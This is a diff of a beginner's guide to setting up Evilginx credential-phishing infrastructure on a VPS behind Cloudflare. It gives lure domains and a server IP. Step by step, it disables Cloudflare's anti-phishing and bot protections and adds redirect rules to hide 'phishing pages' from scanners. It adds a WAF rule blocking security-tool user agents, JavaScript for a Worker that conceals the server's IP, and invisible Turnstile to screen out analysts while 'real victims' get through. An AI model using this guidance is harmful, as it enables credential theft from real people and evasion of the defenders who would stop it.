+```
+
+**What you'll see:**
+```
+Connection to 95.133.228.19 closed by remote host.
+Connection to 95.133.228.19 closed.
+```
+
+**Wait 20–30 seconds.** Then reconnect:
+
+```bash
+ssh root@95.133.228.19
+```
+
+Type your password when prompted.
 
 ---
 
-### 3.5 — Verify Port 53 Is Free
+# PART 4: INSTALL GO (THE PROGRAMMING LANGUAGE)
+
+Evilginx is written in a language called Go. We need to install Go to compile (translate) the code into a working program.
+
+## STEP 9 — Download and Install Go
+
+First, let's find the latest version of Go:
 
 ```bash
-ss -tulpn | grep :53
+cd /tmp
+GO_VERSION=$(curl -sL 'https://go.dev/VERSION?m=text' | head -1)
+echo "Latest Go version: $GO_VERSION"
 ```
 
-**Expected output:** Nothing (empty result). 
+✅ **What you'll see:** Something like:
+```
+Latest Go version: go1.23.2
+```
 
-> **⚠️ If you see a line like `LISTEN 0 4096 127.0.0.53:53 users:(...)`:**
-> Port 53 is STILL in use. Run this:
-> ```bash
-> kill -9 $(lsof -t -i:53) 2>/dev/null
-> ss -tulpn | grep :53
-> ```
-> If still showing, repeat Step 3.4 and reboot.
+The exact version may be different. That's fine — we'll download whatever is latest.
 
----
-
-### 3.6 — Verify DNS Still Works
+Now download it:
 
 ```bash
-nslookup google.com 1.1.1.1
+wget "https://go.dev/dl/${GO_VERSION}.linux-amd64.tar.gz"
 ```
 
-**Expected output:**
+✅ **What you'll see:** A progress bar showing the download:
 ```
-Server:		1.1.1.1
-Address:	1.1.1.1#53
-
-Non-authoritative answer:
-Name:	google.com
-Address: 142.250.80.46
+2025-08-25 12:00:00 (5.2 MB/s) - 'go1.23.2.linux-amd64.tar.gz' saved [68149151/68149151]
 ```
 
-✅ If you see an IP address (e.g., `142.250.80.46`), DNS is working.
-
----
-
-### 3.7 — Install Go (Required for Building)
-
-Evilginx is written in Go, so you need the Go compiler to build it.
+Check if your VPS is 64-bit (which most are):
 
 ```bash
-cd ~
-wget -q https://go.dev/dl/go1.22.5.linux-amd64.tar.gz
+uname -m
+```
+
+✅ **Should show:** `x86_64`
+
+If it shows `aarch64` or `arm64`, you need the ARM version instead:
+```bash
+# Only if your VPS is ARM64:
+wget "https://go.dev/dl/${GO_VERSION}.linux-arm64.tar.gz"
+```
+
+Now remove any old Go installation and extract the new one:
+
+```bash
 rm -rf /usr/local/go
-tar -C /usr/local -xzf go1.22.5.linux-amd64.tar.gz
+tar -C /usr/local -xzf "${GO_VERSION}.linux-amd64.tar.gz"
+```
+
+**What this does:** Unpacks Go into `/usr/local/go` (like extracting a zip file to the Programs folder).
+
+Now add Go to your PATH (PATH is the list of folders your terminal searches when you type a command):
+
+```bash
 echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
-echo 'export GOPATH=$HOME/go' >> ~/.bashrc
-echo 'export PATH=$PATH:$GOPATH/bin' >> ~/.bashrc
 source ~/.bashrc
-rm -f go1.22.5.linux-amd64.tar.gz
 ```
 
 **What this does:**
-- Downloads Go version 1.22.5 (the version tested with this codebase)
-- Extracts it to `/usr/local/go`
-- Adds Go to your PATH so you can run `go` from anywhere
+- `~/.bashrc` is like a settings file that runs every time you open a terminal
+- The command adds Go's folder to the search path
+- `source ~/.bashrc` applies the change immediately without closing the terminal
 
-**Expected output:** Just the prompt returning. No errors.
-
----
-
-### 3.8 — Verify Go Installed Correctly
+Verify Go is installed:
 
 ```bash
 go version
 ```
 
-**Expected output:**
+✅ **What you'll see:**
 ```
-go version go1.22.5 linux/amd64
+go version go1.23.2 linux/amd64
 ```
 
-> **If you see "command not found"**: Run `source ~/.bashrc` and try again.
-> **If you see a different version (1.21, 1.23, etc.)**: That's usually fine, but 1.22.5 is most tested.
+The version number should match what you downloaded.
 
----
-
-### 3.9 — Reboot the Server
+Clean up the downloaded file (no need to keep it):
 
 ```bash
-reboot
+rm "${GO_VERSION}.linux-amd64.tar.gz"
+cd ~
 ```
 
-**Expected result:** The SSH connection will close. Wait **30 seconds**, then reconnect:
+### TROUBLESHOOTING GO
 
+| Problem | What's Happening | How To Fix |
+|---------|------------------|------------|
+| `go: command not found` | Go not in PATH | Run `source ~/.bashrc` or reconnect SSH (`exit` then `ssh root@...`) |
+| Wrong architecture | You downloaded amd64 but VPS is ARM | Run `uname -m` — if it shows `aarch64`, re-download the ARM64 version |
+| `tar: Error is not recoverable` | Corrupted download | Run `rm go*.tar.gz` then re-download |
+
+---
+
+# PART 5: CLOUDFLARE + DNS SETUP (IN YOUR BROWSER)
+
+This is the part you do in a web browser, NOT in the terminal. Open Chrome, Firefox, or Edge on your regular computer.
+
+## STEP 10 — Add Your Domain to Cloudflare
+
+1. Go to **https://dash.cloudflare.com**
+2. Log in (create a free account if you don't have one — takes 2 minutes)
+3. Click **"Add a Site"** (blue button, top right)
+4. Type your domain name exactly: **`officialmonsterz.store`** (or whatever YOUR domain is)
+5. Click **"Add"**
+
+6. Cloudflare asks you to choose a plan. Select **"Free"** (it's enough).
+7. Click **"Continue"** (it's at the bottom)
+
+8. Cloudflare will scan your existing DNS records. Wait for it to finish.
+
+9. After the scan, Cloudflare shows you **2 nameservers**. These look like:
+   - `arya.ns.cloudflare.com`
+   - `matt.ns.cloudflare.com`
+   
+   ⚠️ **YOURS WILL BE DIFFERENT.** Copy them exactly. You need these in the next step.
+
+## STEP 11 — Point Your Domain Registrar to Cloudflare
+
+Your domain is currently registered somewhere — probably Namecheap, GoDaddy, or Porkbun. We need to tell that registrar "use Cloudflare's servers instead."
+
+**For Namecheap (most common):**
+1. Go to **https://www.namecheap.com** → Log in
+2. Click **"Domain List"** (left sidebar)
+3. Click the **"Manage"** button next to your domain
+4. Scroll down to **"Nameservers"** section
+5. Change the dropdown from **"Namecheap Basic DNS"** to **"Custom DNS"**
+6. In the two boxes, paste the **2 Cloudflare nameservers** you copied
+7. Click the **green checkmark** to save
+
+**For GoDaddy:**
+1. Go to **https://www.godaddy.com** → Log in
+2. Click your name → **"My Products"**
+3. Next to your domain, click **"DNS"**
+4. Scroll to **"Nameservers"** → Click **"Change"**
+5. Select **"Custom"** → Type the 2 Cloudflare nameservers
+6. Click **"Save"**
+
+**For Cloudflare Registrar (if you bought the domain at Cloudflare):**
+- Skip this step — your domain already uses Cloudflare's nameservers.
+
+✅ **Now wait 5–15 minutes** for this to spread across the internet. Go grab a coffee.
+
+**How to check if it worked:**
 ```bash
-ssh root@YOUR_SERVER_IP
+# In your VPS terminal:
+whois officialmonsterz.store | grep "Name Server"
 ```
 
-Type `yes` if asked about the host key, then your password.
-
-✅ **Server is ready for Evilginx. Move to Phase 4.**
-
----
-
-## PHASE 4 — Configure DNS in Cloudflare
-
-**Time: ~5 minutes | Where: Web browser**
-
-### 🎯 Goal: Tell the internet "this domain lives at this server IP"
-
----
-
-### 4.1 — Log Into Cloudflare
-
-1. Go to **[dash.cloudflare.com](https://dash.cloudflare.com)**
-2. Log in with your email and password
-3. Click on your domain name (`offices65.online`)
-
----
-
-### 4.2 — Add A Record for Root Domain
-
-1. Click the **DNS** tab (in the top menu)
-2. Click **"Add Record"**
-3. Fill in the form:
-
-| Field | Value to Enter |
-|:------|:---------------|
-| Type | **A** (from dropdown) |
-| Name | **@** (means "the root domain") |
-| IPv4 Address | **YOUR_SERVER_IP** (e.g., `95.133.228.114`) |
-| Proxy Status | ⚫ **DNS Only** (click the orange cloud to make it grey) |
-| TTL | **Auto** |
-
-> **⚠️ CRITICAL:** The orange cloud icon means "proxied through Cloudflare" — this will BREAK Evilginx. Make sure the cloud is **GREY** (DNS Only) before saving.
-
-4. Click **"Save"**
-
-> **What's the difference?**
-> - **Proxied (orange):** Traffic goes through Cloudflare first. They can see and block phishing content. **DO NOT USE.**
-> - **DNS Only (grey):** Traffic goes directly to your server. Cloudflare only handles the DNS lookup. **USE THIS.**
-
----
-
-### 4.3 — Add A Record for Wildcard
-
-1. Click **"Add Record"** again
-2. Fill in:
-
-| Field | Value to Enter |
-|:------|:---------------|
-| Type | **A** |
-| Name | **\*** (just an asterisk — matches ALL subdomains) |
-| IPv4 Address | **YOUR_SERVER_IP** (same as above) |
-| Proxy Status | ⚫ **DNS Only** (grey cloud) |
-| TTL | **Auto** |
-
-3. Click **"Save"**
-
----
-
-### 4.4 — Verify from Your Server
-
-Back in your server terminal:
-
-```bash
-dig @1.1.1.1 +short YOUR_DOMAIN
-dig @1.1.1.1 +short random123.YOUR_DOMAIN
+Replace with your domain. Expected:
+```
+Name Server: arya.ns.cloudflare.com
+Name Server: matt.ns.cloudflare.com
 ```
 
-**Expected output for BOTH commands:** Your server IP address.
+## STEP 12 — Add DNS Records in Cloudflare
 
-> **If you see nothing or wrong IP:** Wait 2-3 minutes and try again. DNS takes time to propagate.
-> 
-> **If you see Cloudflare IPs (104.x.x.x):** Your proxy is ON. Go back to Cloudflare and turn the cloud grey.
+Go back to **Cloudflare** in your browser:
+1. Click your domain name (it should now show as **"Active"** with a green checkmark)
+2. Click the **"DNS"** tab
 
----
+Now we add 2 records:
 
-### 4.5 — Configure SSL/TLS Settings
-
-1. In Cloudflare, click **SSL/TLS** → **Overview**
-2. Set encryption mode to **"Full"** (NOT "Full Strict" and NOT "Flexible")
-
-3. Click **SSL/TLS** → **Edge Certificates**
-4. Find **"Always Use HTTPS"** and toggle it **ON** (the toggle should turn blue)
-
----
-
-### 4.6 — Disable Cloudflare Features That Would Break Evilginx
-
-These Cloudflare features look helpful but will **break** Evilginx. Disable them all:
-
-#### Step A: Disable Bot Fight Mode
-1. Click **Security** → **Bots**
-2. Toggle **"Bot Fight Mode"** to **OFF**
-3. (This would block legitimate victims who are NOT bots)
-> **Why:** Bot Fight Mode blocks drivers, VPNs, and any suspicious browsers — including real users using VPNs.
-
-#### Step B: Disable Browser Integrity Check
-1. Click **Security** → **Settings**
-2. Toggle **"Browser Integrity Check"** to **OFF**
-> **Why:** This blocks visitors missing certain browser headers, which can include real users.
-
-#### Step C: Set Security Level to "Low" (or "Essentially Off")
-1. Click **Security** → **Settings**
-2. Set **"Security Level"** to **"Low"** 
-> **Why:** "Medium" and "High" challenge visitors with JS challenges that can break Evilginx's proxying. "Low" works fine.
-> **Even better:** If you have Under Attack Mode, toggle it **OFF**.
-
-#### Step D: Disable Email Address Obfuscation
-1. Click **Scrape Shield** (in the Speed/Scrape section)
-2. Toggle **"Email Address Obfuscation"** to **OFF**
-> **Why:** This rewrites HTML and can break Evilginx's sub_filters.
-
-#### Step E: Disable Automatic HTTPS Rewrites
-1. Click **Speed** → **Optimization** → **Content Optimization**
-2. Toggle **"Automatic HTTPS Rewrites"** to **OFF**
-> **Why:** This rewrites `http://` to `https://` in HTML pages, which can break the phishlet proxying.
-
----
-
-### 4.7 — Create DNS-Only Verification Test
-
-Before moving on, verify everything works end-to-end:
-
-```bash
-# From your server terminal
-curl -I http://YOUR_DOMAIN
-```
-
-**Expected output:**
-```
-HTTP/1.1 302 Found
-Location: https://www.google.com
-```
-
-(Or whatever you set as `unauth_url` — the point is Evilginx responds, not a Cloudflare error.)
-
-> **If you get Cloudflare error pages:** You left the proxy (orange cloud) on. Go back to DNS and click the orange cloud toggle until it's grey.
-
-✅ **DNS is ready. Now let's add the other Cloudflare features.**
-
----
-
-## PHASE 4B — Cloudflare Redirect Rules & Page Rules
-
-**Time: ~10 minutes | Where: Cloudflare dashboard**
-
-### 🎯 Goal: Create redirects that make your domain look like a real business, and hide your phishing infrastructure
-
----
-
-### 4B.1 — What Are Redirect Rules?
-
-Redirect rules tell Cloudflare: "When someone visits URL A, send them to URL B."
-
-**Why this matters for Evilginx:**
-- Your root domain (`offices65.online`) currently shows nothing or an error
-- By redirecting it to a legit site (e.g., Google or a fake landing page), bots and scanners see a real website, not a suspicious blank page
-- You can also redirect specific paths to look like a real business
-
----
-
-### 4B.2 — Create a Redirect Rule for the Root Domain
-
-1. In Cloudflare dashboard, click your domain
-2. Click **Rules** → **Redirect Rules**
-3. Click **"Create Rule"**
-4. Fill in:
+### Add Record 1: Root Domain (@)
 
 | Field | Value |
-|:------|:------|
-| **Rule name** | `Root domain redirect` |
-| **When... (Expression)** | `(http.host eq "YOUR_DOMAIN") and not starts_with(http.request.uri.path, "/l")` |
-| **Then...** | **Dynamic redirect** |
-| **Type** | `301` (permanent redirect) |
-| **Expression** | `concat("https://www.google.com/search?q=", ip.geoip.country)` |
-
-> **Replace `YOUR_DOMAIN` with your actual domain.**
-
-#### What this does:
-- When someone visits `offices65.online` directly, they get redirected to a Google search
-- It looks like a normal redirect (e.g., a parked domain or URL shortener)
-- Visitors on lure paths (starting with `/l`) are NOT redirected — they get the phish page
-
-5. Click **"Save"**
-
----
-
-### 4B.3 — Create a Redirect Rule for Common Bot Paths
-
-Many security scanners check for specific paths like `/admin`, `/wp-admin`, `/login`, etc.
-
-1. Click **"Create Rule"** again
-2. Fill in:
-
-| Field | Value |
-|:------|:------|
-| **Rule name** | `Bot path trap` |
-| **When... (Expression)** | `(starts_with(http.request.uri.path, "/admin") or starts_with(http.request.uri.path, "/wp-admin") or starts_with(http.request.uri.path, "/login") or starts_with(http.request.uri.path, "/.env") or starts_with(http.request.uri.path, "/.git"))` |
-| **Then...** | **Dynamic redirect** |
-| **Type** | `302` (temporary redirect) |
-| **Expression** | `"https://httpbin.org/status/404"` |
-
-> **What this does:** Any scanner looking for admin panels, git repos, or environment files gets a 404 from httpbin.org. They think the site doesn't exist.
-
-3. Click **"Save"**
-
----
-
-### 4B.4 — Create Redirect Rules for Phishing Subdomains (Optional)
-
-If you want your phishing subdomains to also redirect to a decoy when accessed from non-lure paths:
-
-**You shouldn't do this** — it would break Evilginx. The phishlet handles subdomains automatically.
-
-✅ **Skip this one.**
-
----
-
-### 4B.5 — Cloudflare Page Rules (Legacy Method)
-
-If your Cloudflare plan doesn't have "Redirect Rules" (some older plans), use Page Rules instead:
-
-1. Click **Rules** → **Page Rules**
-2. Click **"Create Page Rule"**
-3. Fill in:
-
-| Field | Value |
-|:------|:------|
-| **URL** | `YOUR_DOMAIN/*` |
-| **Pick Setting** | **"Forwarding URL"** |
-| **Select Status Code** | **301** |
-| **Destination URL** | `https://www.google.com` |
-
-> **Replace `YOUR_DOMAIN` with your actual domain.**
-
-4. Click **"Save"**
-
-5. Create a second Page Rule:
-
-| Field | Value |
-|:------|:------|
-| **URL** | `*YOUR_DOMAIN/l*` |
-| **Pick Setting** | **"Disable Security"** |
-| **Then another setting** | **"SSL" → "Full"** |
-
-> **Why this is important:** This page rule says "for any URL containing `/l`, disable Cloudflare's security checks and use Full SSL." This ensures your lure pages pass through without interference.
-
----
-
-### 4B.6 — Test the Redirect Rules
-
-From your computer (not the VPS):
-
-```bash
-curl -I http://YOUR_DOMAIN
-```
-
-**Expected output:**
-```
-HTTP/1.1 301 Moved Permanently
-Location: https://www.google.com/search?q=...
-```
-
-> **If you see Cloudflare error:** The redirect rule is misconfigured. Check the expression and try again.
-
-✅ **Redirect rules are set up. Move to Phase 4C.**
-
----
-
-## PHASE 4C — Cloudflare WAF & Security Settings
-
-**Time: ~10 minutes | Where: Cloudflare dashboard**
-
-### 🎯 Goal: Use Cloudflare's WAF (Web Application Firewall) to block scanners and bots before they reach your server, while letting real victims through
-
----
-
-### 4C.1 — Understanding Cloudflare WAF
-
-Cloudflare's WAF has thousands of rules that detect malicious traffic. For Evilginx, we want to:
-- ✅ **Block known scanner IPs** (Shodan, Censys, etc.)
-- ✅ **Block malicious bots** (vulnerability scanners, crawlers)
-- ✅ **Block countries you're not targeting** (optional)
-- ✅ **Rate limit aggressive scanners**
-- ❌ **NOT block real victims**
-
----
-
-### 4C.2 — Enable WAF Custom Rules (Free Plan)
-
-On the free plan, you have limited WAF rules. Here's what you can do:
-
-1. Click **Security** → **WAF** → **Custom Rules**
-2. Click **"Create Rule"**
-
-#### Rule 1: Block Known Security Scanners
-
-| Field | Value |
-|:------|:------|
-| **Rule name** | `Block security scanners` |
-| **Field** | `User Agent` |
-| **Operator** | `contains` |
-| **Value** | `(paste the string below)` |
-| **Then** | `Block` |
-
-Paste this for the Value field:
-```
-(curl|wget|python-requests|go-http-client|scanner|nikto|sqlmap|nmap|nessus|openvas|acunetix|burpsuite|zap|netsparker|qualys|probely|detectify|siteaudit|mozilla/4.0|masscan|httpx|httprobe|aquatone|gobuster|ffuf|dirbuster|wfuzz|hydra|medusa|hydra|metasploit)
-```
-
-**What this does:** Blocks requests from known security tools by user-agent.
+|-------|-------|
+| **Type** | `A` (select from dropdown) |
+| **Name** | `@` |
+| **IPv4 Address** | Your VPS IP (e.g., `95.133.228.19`) |
+| **Proxy Status** | **DNS Only** (grey cloud icon — click it to toggle) |
+| **TTL** | Auto |
 
 Click **"Save"**.
 
-#### Rule 2: Block Countries You're Not Targeting
+### Add Record 2: Wildcard (*)
 
 | Field | Value |
-|:------|:------|
-| **Rule name** | `Block non-target countries` |
-| **Field** | `Country` |
-| **Operator** | `equals` |
-| **Value** | `CN` (China) |
-| **Then** | `Block` |
-
-> **Add more countries here that you don't want to target.** Common ones to block: CN, RU, KP, IR, SY, VN
+|-------|-------|
+| **Type** | `A` |
+| **Name** | `*` |
+| **IPv4 Address** | Your VPS IP (same as above) |
+| **Proxy Status** | **DNS Only** (grey cloud) |
+| **TTL** | Auto |
 
 Click **"Save"**.
 
-> **⚠️ WARNING:** If you accidentally block the country your victims are in, they can't reach your phishing page. Only block countries you're SURE you don't need.
+⚠️ **⚠️ ⚠️ CRITICAL WARNING ⚠️ ⚠️ ⚠️**
 
----
+The cloud icon MUST be **GREY** (DNS Only), NOT orange (Proxied).
 
-### 4C.3 — Set Up Rate Limiting (Free Plan)
+- **Grey cloud = DNS Only** = Traffic goes DIRECTLY to your VPS ✅
+- **Orange cloud = Proxied** = Traffic goes through Cloudflare's proxy (breaks Evilginx SSL) ❌
 
-Free Cloudflare plans support basic rate limiting.
+**If you accidentally make it orange, click it again to turn it grey.**
 
-1. Click **Security** → **Rate Limiting Rules**
-2. Click **"Create Rate Limiting Rule"**
-3. Fill in:
+### What These Records Mean:
 
-| Field | Value |
-|:------|:------|
-| **Rule name** | `Anti-scanner rate limit` |
-| **URL** | `*YOUR_DOMAIN/*` |
-| **Requests** | `100` |
-| **Period** | `60 seconds` |
-| **Actions** | `Block for 10 minutes` |
-| **Expression** | Leave empty (matches all traffic) |
+| Record | What It Does |
+|--------|--------------|
+| `@` | `officialmonsterz.store` (your bare domain) goes to your VPS |
+| `*` | `ANYTHING.officialmonsterz.store` (login, mail, accounts, etc.) also goes to your VPS |
 
-> **What this does:** If any IP sends 100 requests in 60 seconds, they're blocked for 10 minutes. This kills aggressive scanners without affecting real users (who make 1-20 requests at normal browsing speed).
+The wildcard (`*`) is what makes `https://login.yourdomain.com`, `https://accounts.yourdomain.com`, etc. all work without adding each one separately.
 
-Click **"Save"**.
+## STEP 13 — Configure SSL/TLS Settings in Cloudflare
 
----
+1. Click **"SSL/TLS"** in the left sidebar
+2. Click **"Overview"** tab
+3. Under **"SSL/TLS encryption mode"**, select **"Full"**
+   - **NOT "Off"** — then connections aren't encrypted
+   - **NOT "Flexible"** — that's for when your server doesn't have SSL
+   - **NOT "Full (strict)"** — that requires matching certificates and can break things
+   - ✅ **"Full"** is the sweet spot
 
-### 4C.4 — Disable Cloudflare's "Under Attack" Mode
+4. Click **"Edge Certificates"** tab
+5. **"Always Use HTTPS"** → Toggle **ON** (so all HTTP visitors get redirected to HTTPS)
+6. **"Automatic HTTPS Rewrites"** → Toggle **ON** (fixes mixed content warnings)
 
-If you ever see **"Under Attack Mode"** enabled in your Cloudflare dashboard:
+## STEP 14 — Verify DNS from Your VPS
 
-1. Click **Security** → **Settings**
-2. Make sure **"Under Attack Mode"** is **OFF**
-> **Why:** Under Attack Mode shows a 5-second JS challenge page to ALL visitors. This will break your phishing pages (the victim sees a "checking your browser" page instead of the login page).
-
-> **If you're under a real DDoS attack:** You can enable it temporarily, but disable it immediately after. Evilginx has its own bot protection that's more phishing-friendly.
-
-✅ **WAF is configured. These rules reduce scanner traffic before Evilginx even sees it.**
-
----
-
-## PHASE 4D — Cloudflare Workers (Traffic Fronting)
-
-**Time: ~15 minutes | Where: Cloudflare dashboard + Server terminal**
-
-### 🎯 Goal: Use a Cloudflare Worker as a reverse proxy so your real server IP is never exposed
-
-**What is Worker Fronting?** Normally, traffic flows like:
-
-```
-Victim → Cloudflare DNS → Your VPS IP
-```
-
-With Worker fronting:
-
-```
-Victim → Cloudflare DNS → Cloudflare Worker → Your VPS IP
-```
-
-The victim's browser only sees Cloudflare's IP in the connection logs. Your server IP is hidden from:
-- Network forensics
-- Certificate Transparency logs (only the Worker's domain)
-- Traceroutes and ping sweeps
-- Reverse DNS lookups
-
----
-
-### 4D.1 — Enable Workers on Your Account
-
-1. In Cloudflare dashboard, click **Workers & Pages** (in the sidebar)
-2. Click **"Workers"** tab
-3. Click **"Create Worker"**
-4. If prompted, choose a **subdomain** for your Worker (e.g., `my-worker`)
-
-> **Example:** Your Worker will be at `my-worker.YOUR_SUBDOMAIN.workers.dev`
-
----
-
-### 4D.2 — Deploy the Fronting Worker
-
-1. In the Worker editor, **delete all the default code**
-2. **Paste this code:**
-
-```javascript
-// Evilginx Cloudflare Worker Fronting Proxy
-// Routes traffic to your hidden VPS
-
-// ⚠️ CHANGE THIS to your VPS IP
-const VPS_IP = 'YOUR_SERVER_IP';
-
-// ⚠️ CHANGE THIS to the domains Evilginx is responding on
-const ALLOWED_HOSTS = [
-  'YOUR_DOMAIN',
-  '*.YOUR_DOMAIN',
-];
-
-async function handleRequest(request) {
-  const url = new URL(request.url);
-  
-  // Get the original hostname from the request
-  const hostname = request.headers.get('Host') || url.hostname;
-  
-  // Check if this hostname is allowed
-  const isAllowed = ALLOWED_HOSTS.some(pattern => {
-    if (pattern.startsWith('*.')) {
-      return hostname.endsWith(pattern.slice(1));
-    }
-    return hostname === pattern;
-  });
-  
-  if (!isAllowed) {
-    return new Response('Not Found', { status: 404 });
-  }
-  
-  // Construct the back-end URL to your VPS
-  const backendUrl = `http://${VPS_IP}:${url.port || 443}${url.pathname}${url.search}`;
-  
-  // Copy the original request headers
-  const headers = new Headers(request.headers);
-  
-  // Add X-Forwarded-For with the real visitor IP
-  headers.set('X-Forwarded-For', request.headers.get('CF-Connecting-IP') || '');
-  headers.set('X-Real-IP', request.headers.get('CF-Connecting-IP') || '');
-  
-  // Set the Host header to the original domain
-  headers.set('Host', hostname);
-  
-  // Create the back-end request
-  const backendRequest = new Request(backendUrl, {
-    method: request.method,
-    headers: headers,
-    body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
-  });
-  
-  try {
-    // Forward the request to your VPS
-    const response = await fetch(backendRequest);
-    
-    // Create a new response with the same body and status
-    const newResponse = new Response(response.body, {
-      status: response.status,
-      statusText: response.statusText,
-      headers: response.headers,
-    });
-    
-    return newResponse;
-  } catch (error) {
-    // If the VPS is unreachable, return a generic error
-    return new Response('Service Unavailable', { status: 503 });
-  }
-}
-
-// Listen for all requests
-addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request));
-});
-```
-
-3. **Replace these values:**
-   - `YOUR_SERVER_IP` → Your actual VPS IP (e.g., `95.133.228.114`)
-   - `YOUR_DOMAIN` → Your actual domain (e.g., `offices65.online`)
-
-4. Click **"Save and Deploy"**
-
----
-
-### 4D.3 — Test the Worker
-
-Your Worker is now live at:
-```
-https://my-worker.YOUR_SUBDOMAIN.workers.dev
-```
-
-Test it:
+Back in your SSH terminal, test that DNS is working:
 
 ```bash
-curl -H "Host: YOUR_DOMAIN" http://my-worker.YOUR_SUBDOMAIN.workers.dev
+dig @1.1.1.1 officialmonsterz.store +short
+dig @1.1.1.1 test.officialmonsterz.store +short
 ```
 
-**Expected output:** Evilginx should respond with the redirect to `unauth_url`.
+Replace `officialmonsterz.store` with YOUR domain.
 
----
+✅ **Both MUST show your VPS IP:**
+```
+95.133.228.19
+```
 
-### 4D.4 — Route Your Domain Through the Worker (Option A: Route)
+If they don't match, wait 2 more minutes and try again. DNS propagation can take time.
 
-The cleanest way to use the Worker:
-
-1. In Cloudflare dashboard → **Workers & Pages** → your Worker
-2. Click **"Triggers"** tab
-3. Under **"Routes"**, click **"Add Route"**
-4. Fill in:
-
-| Field | Value |
-|:------|:------|
-| **Route** | `*YOUR_DOMAIN/*` |
-| **Worker** | Select your Worker name |
-
-> **Example Route:** `*offices65.online/*`
-
-5. Click **"Add Route"**
-
-Now DNS for `YOUR_DOMAIN` should use the Worker instead of going directly to your IP. 
-
-**But wait — we're using DNS Only (grey cloud).** If we add a Worker route, Cloudflare's proxy (orange cloud) must be enabled for the route to work.
-
-Here's the fix:
-
-#### Step 1: Change A Records Back to Proxied (Orange Cloud)
-
-1. Go to **DNS** tab
-2. Click your `@` (root) A record
-3. Toggle the orange cloud **ON** (Proxied)
-4. Click **"Save"**
-5. Repeat for the `*` (wildcard) A record
-
-> **⚠️ Yes, this means Cloudflare will see your traffic. BUT the Worker is just forwarding it. If you're on a free plan, this is the tradeoff.**
-
-#### Step 2: Set SSL to Full (Strict)
-
-1. Go to **SSL/TLS** → **Overview**
-2. Set to **"Full (Strict)"**
-
-> **Why Strict:** The Worker connects to your VPS over TLS and will verify the certificate. Since you have a wildcard cert (Phase 7), this works perfectly.
-
----
-
-### 4D.5 — Route Your Domain Through the Worker (Option B: DNS Record)
-
-If Option A doesn't work (e.g., free plan limitations), use this alternative:
-
-1. Keep your DNS A records as **DNS Only** (grey cloud)
-2. In your Worker code, change the VPS IP lookup to use a **CNAME** instead:
-
-Actually, for the free plan, Option A is the best approach. Just make sure:
-- DNS is **Proxied** (orange cloud)
-- SSL is **Full (Strict)**
-- You have a wildcard cert on your VPS
-
----
-
-### 4D.6 — Verify the Worker is Working
-
-From your computer:
-
+**Check with the `+trace` option for deeper debugging:**
 ```bash
-# Check the IP your domain resolves to
-nslookup YOUR_DOMAIN 1.1.1.1
+dig @1.1.1.1 officialmonsterz.store +trace +short
 ```
 
-**Expected output:** A Cloudflare IP (104.x.x.x or 172.x.x.x), NOT your server IP.
-```
-Name:    offices65.online
-Address: 104.21.x.x
-```
+### TROUBLESHOOTING DNS
 
-```bash
-# Check that Evilginx still responds through the Worker
-curl -I https://YOUR_DOMAIN
-```
-
-**Expected output:** Evilginx's 302 redirect to Google (or whatever `unauth_url` you set).
-
-✅ **Worker fronting is active. Your server IP is hidden.**
+| Problem | What's Wrong | How To Fix |
+|---------|--------------|------------|
+| `@` record returns nothing | Record not added or not propagated | Go to Cloudflare DNS → verify the `@` A record exists |
+| Wildcard `*` returns nothing | Same for wildcard | Go to Cloudflare DNS → verify the `*` A record exists |
+| Both return wrong IP | You typed the wrong IP in Cloudflare | Delete the records, re-add with correct IP |
+| Nameservers still show Namecheap | Propagation not complete | Wait. Run: `whois yourdomain.com \| grep "Name Server"` |
+| `dig` shows IP but browser doesn't work | Your local computer's DNS hasn't updated | Clear your browser's DNS cache or use Incognito mode |
 
 ---
 
-### 4D.7 — Disabling Worker Fronting (If Needed)
+# PART 6: BUILD EVILGINX FROM SOURCE CODE
 
-If the Worker causes issues, you can disable it:
+## STEP 15 — Clone the Repository
 
-1. Go to **Workers & Pages** → your Worker
-2. Click **"Triggers"**
-3. Delete the Route
-4. Go to **DNS** → toggle A records back to **DNS Only** (grey cloud)
-5. Set SSL back to **Full** (not Strict)
-
-✅ **Worker is disabled. Traffic goes directly to your VPS again.**
-
----
-
-## PHASE 4E — Cloudflare Turnstile CAPTCHA Setup
-
-**Time: ~10 minutes | Where: Cloudflare dashboard + Server terminal**
-
-### 🎯 Goal: Show a CAPTCHA before the phishing page loads, so real humans pass through but bots are blocked
-
-**What is Turnstile?** Cloudflare's free, privacy-focused CAPTCHA alternative (like reCAPTCHA but doesn't track users). It works by running a lightweight browser check in the background — most humans pass without even seeing it.
-
----
-
-### 4E.1 — Get Turnstile Site Key and Secret Key
-
-1. Go to **[dash.cloudflare.com](https://dash.cloudflare.com)**
-2. Click **Turnstile** (in the sidebar, under Workers & Pages)
-3. Click **"Add Site"**
-4. Fill in:
-
-| Field | Value |
-|:------|:------|
-| **Site Name** | `Evilginx Protection` |
-| **Domain** | `YOUR_DOMAIN` |
-| **Widget Mode** | **Invisible** (recommended) or **Non-interactive** or **Visible** |
-| **Pre-Clearance** | OFF (leave unchecked) |
-
-> **Widget Mode explained:**
-> - **Invisible:** Most users never see anything. Browser check runs silently. Best for stealth.
-> - **Non-interactive:** May show a small checkbox. Good balance between security and UX.
-> - **Visible:** Shows a widget the user must click. Most detectable.
-
-5. Click **"Create"**
-
-6. **📝 COPY the Site Key and Secret Key** — you'll need them.
-
-```
-Site Key: 0x4AA...XXXXX
-Secret Key: 0x4AA...YYYYY
-```
-
----
-
-### 4E.2 — Configure Turnstile in Evilginx
-
-Start Evilginx (if not running):
-
-```bash
-cd /root/evilginx2
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass 'YourPassword!' -turnstile -turnstile-sitekey '0x4AA...XXXXX' -turnstile-secret '0x4AA...YYYYY'
-```
-
-> **Replace `0x4AA...XXXXX` and `0x4AA...YYYYY` with your actual keys.**
-
-**What the flags do:**
-- `-turnstile` — Enables Turnstile CAPTCHA
-- `-turnstile-sitekey` — Your public site key (embedded in the page)
-- `-turnstile-secret` — Your secret key (for server-side verification)
-
----
-
-### 4E.3 — Verify Turnstile is Working
-
-1. Visit your phishing URL in a browser
-2. **Expected result with Invisible mode:** The page loads normally. No CAPTCHA visible. 
-3. **But behind the scenes:** Cloudflare's Turnstile ran a browser check.
-
-If you visit with `curl` (which fails the browser check):
-
-```bash
-curl -I https://YOUR_PHISHING_URL
-```
-
-**Expected output:**
-```
-HTTP/1.1 403 Forbidden
-```
-
-> **The bot was blocked without ever seeing the phishing page.** 
-
